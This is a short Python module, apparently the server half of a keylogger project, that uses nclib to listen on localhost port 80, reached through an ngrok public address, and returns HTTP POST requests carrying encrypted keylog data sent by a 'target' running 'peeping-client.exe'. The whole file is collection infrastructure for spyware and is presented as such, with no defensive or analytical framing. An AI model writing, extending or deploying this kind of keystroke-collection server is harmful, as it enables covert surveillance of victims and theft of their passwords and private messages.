from nclib import TCPServer

# This module uses nclib to bind to localhost:80 which is where the target running peeping-client.exe
# will send all encrypted keylog data packed in an http post request

def get_raw_post_data():
    
    # This method binds to localhost:80 which is where an ngrok public address should point
    
    post_server = TCPServer(('127.0.0.1', 80))
    
    # It then returns post requests recieved from the target containing keylog data

    for request in post_server:

        raw_post_data = request.recv()
        return raw_post_data.decode('utf-8')